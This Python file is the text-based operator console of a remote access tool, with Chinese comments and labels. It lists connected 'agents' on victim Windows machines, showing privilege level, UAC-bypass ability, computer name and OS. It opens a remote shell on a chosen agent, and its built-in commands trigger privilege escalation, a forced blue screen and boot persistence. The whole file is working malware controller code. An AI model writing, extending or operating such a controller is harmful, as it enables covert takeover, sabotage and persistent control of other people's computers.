# controller_tui.py
import requests, time
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.prompt import Prompt

SERVER = "http://127.0.0.1:1143"  # 改为你的服务端
console = Console()

def fetch_agents():
    try:
        r = requests.get(SERVER + "/agents", timeout=3)
        r.raise_for_status()
        return r.json()
    except:
        return {}

def push_cmd(aid, cmd):
    try:
        requests.post(SERVER + "/push", data={"id": aid, "cmd": cmd}, timeout=3)
    except:
        pass

def pull_results(aid, since):
    try:
        r = requests.post(SERVER + "/results", data={"id": aid, "since": since}, timeout=5)
        r.raise_for_status()
        return r.json()
    except:
        return []

def make_table(agents):
    t = Table(title="Agents")
    t.add_column("ID")
    t.add_column("短ID")
    t.add_column("权限")
    t.add_column("可UAC")
    t.add_column("在线")
    t.add_column("上线时间")
    t.add_column("下线时间")
    t.add_column("计算机名")
    t.add_column("系统")
    now = int(time.time())
    for aid, info in agents.items():
        sid = aid.split("-")[1]
        online = "✅" if info["online"] else "❌"
        first = time.strftime("%F %T", time.localtime(info["first_seen"]))
        last_off = "-" if info["last_offline"] == 0 else time.strftime(
            "%F %T", time.localtime(info["last_offline"])
        )
        t.add_row(
            aid,
            sid,
            info["priv"],
            "是" if info["can_uac"] else "否",
            online,
            first,
            last_off,
            info["computer"],
            info["os"],
        )
    return t

def terminal_mode(aid):
    console.print(
        f"[green]进入 {aid} 终端，/exit 退出，/priv 提权，/bsod 蓝屏，/persist 开机自启[/green]"
    )
    since = int(time.time())  # 进入终端时，只看之后的输出
    while True:
        cmd = Prompt.ask(f"[cyan]{aid}[/cyan]")
        if cmd == "/exit":
            break
        if cmd == "/priv":
            cmd = "__UAC__"
        if cmd == "/bsod":
            cmd = "__BSOD__"
        if cmd == "/persist":
            cmd = "__PERSIST__"
        push_cmd(aid, cmd)
        console.print("-- 输出开始 --")
        deadline = time.time() + 30  # 最多等 30 秒
        while time.time() < deadline:
            rs = pull_results(aid, since)
            if rs:
                for item in rs:
                    console.print(item["output"])
                    since = max(since, item["ts"])
            time.sleep(0.5)
        console.print("-- 输出结束 --")

def main_menu():
    with Live(console=console, refresh_per_second=0.5) as live:
        while True:
            agents = fetch_agents()
            live.update(make_table(agents))
            time.sleep(2)
            if agents:
                choice = Prompt.ask("\n输入 Agent ID 进入终端 或 q 退出", default="")
                if choice == "q":
                    break
                if choice in agents:
                    terminal_mode(choice)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        console.print("Bye")
